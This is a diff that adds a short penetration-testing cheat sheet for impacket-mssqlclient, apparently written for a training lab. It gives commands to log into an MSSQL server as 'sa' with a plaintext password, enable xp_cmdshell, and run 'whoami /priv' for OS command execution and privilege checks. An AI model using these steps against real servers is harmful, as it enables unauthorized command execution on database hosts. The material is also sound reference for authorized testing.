@@ -1,0 +1,19 @@
+[-]======================================[-]
+    impacket-mssqlclient
+[-]======================================[-]
+
+- ---] References
+=====================
+
+
+- ---] quick examples
+=====================
+
+   # connect <username>:<password>@<ip address> 
+1) impacket-mssqlclient sa:poiuytrewq@10.11.1.31
+
+   # enable command execution
+2) enable_xp_cmdshell
+
+   # execute command
+3) xp_cmdshell whoami /priv
